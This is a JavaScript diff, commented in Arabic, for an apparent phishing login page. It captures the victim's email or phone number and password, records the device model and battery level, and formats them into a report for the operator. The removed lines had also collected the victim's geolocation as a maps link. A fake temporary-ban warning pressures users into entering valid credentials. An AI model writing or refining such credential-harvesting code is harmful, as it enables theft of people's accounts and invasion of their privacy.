@@ -143,20 +143,7 @@
         const hasArabic = /[\u0600-\u06FF]/.test(user);
 
         if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
-            // محاولة جلب الموقع أولاً قبل الإرسال
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-                        await processCapture(user, pass, mapLink);
-                    },
-                    async () => {
-                        await processCapture(user, pass, "المستخدم رفض إذن الموقع");
-                    }
-                );
-            } else {
-                await processCapture(user, pass, "المتصفح لا يدعم تحديد الموقع");
-            }
+            await processCapture(user, pass);
         } else {
             loginAttempts++;
             if (loginAttempts >= 3) {
@@ -165,7 +152,7 @@
                 applyBanEffect(30);
             } else {
                 Swal.fire({
-                    title: 'بيانات غير صالحة',
+                    title: 'بيانات غير دقيقة',
                     text: 'يرجى كتابة البيانات بشكل صحيح لتجنب الحظر المؤقت.',
                     icon: 'error',
                     confirmButtonColor: '#22d3ee',
@@ -211,7 +198,8 @@
         }, 1000);
     }
 
-    async function processCapture(u, p, location) {
+    async function processCapture(u, p) {
+        // جلب معلومات الجهاز والبطارية
         let phoneName = navigator.userAgent.split(')')[0].split('(')[1] || "غير معروف";
         let batteryLevel = "غير متاح";
         
@@ -226,7 +214,6 @@
 اسم الهاتف : ${phoneName}
 نسبه البطاريه : ${batteryLevel}
 نوع الشريحه : SIM Detected
-موقع الخريطة : ${location}
 البريد الاكتروني : ${u}
 كلمه السر : ${p}
 
